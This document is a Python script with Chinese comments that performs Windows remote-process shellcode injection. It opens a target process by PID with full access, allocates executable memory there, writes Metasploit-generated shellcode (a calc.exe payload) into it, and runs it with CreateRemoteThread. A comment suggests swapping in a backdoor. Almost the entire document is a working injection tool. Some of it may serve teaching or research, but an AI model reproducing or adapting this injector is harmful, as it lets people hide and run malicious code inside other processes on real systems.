# 代码注入
#!python
#-*- coding:utf-8 -*-
#导入sys库以及ctypes库
import sys
from ctypes import *

PAGE_EXECUTE_READWRITE  =  0x00000040       # 申请内存的访问控制类型为0x00000040，即PAGE_EXECUTE_READWRITE
# | Python位运算符 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。
# 结果是2035711 (0x000F0000 | 0x00100000 | 0xFFF) 和 0x001F0FFF 结果一样
# 意思是 ProcessAccessFlags.All (0x001F0FFF)
PROCESS_ALL_ACCESS  =  ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  =  ( 0x1000 | 0x2000 )

kernel32  =  windll.kernel32
pid  =  int(input())


# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
shellcode = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d"
"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
"\x2e\x65\x78\x65\x00")

code_size = len(shellcode)

# 获取我们要注入的进程句柄
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, pid )

# 为我们的shellcode申请内存
arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
print(arg_address)

# 在内存中写入shellcode
written = c_int(0)
ret = kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))


# 创建远程线程，指定入口为我们的shellcode头部
thread_id = c_ulong(0)
print(thread_id)
hLoadThread = kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id))
if not hLoadThread:
    print("[*] Failed to inject shellcode. Exiting.")

print("[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value)
kernel32.WaitForSingleObject(hLoadThread, INFINITE)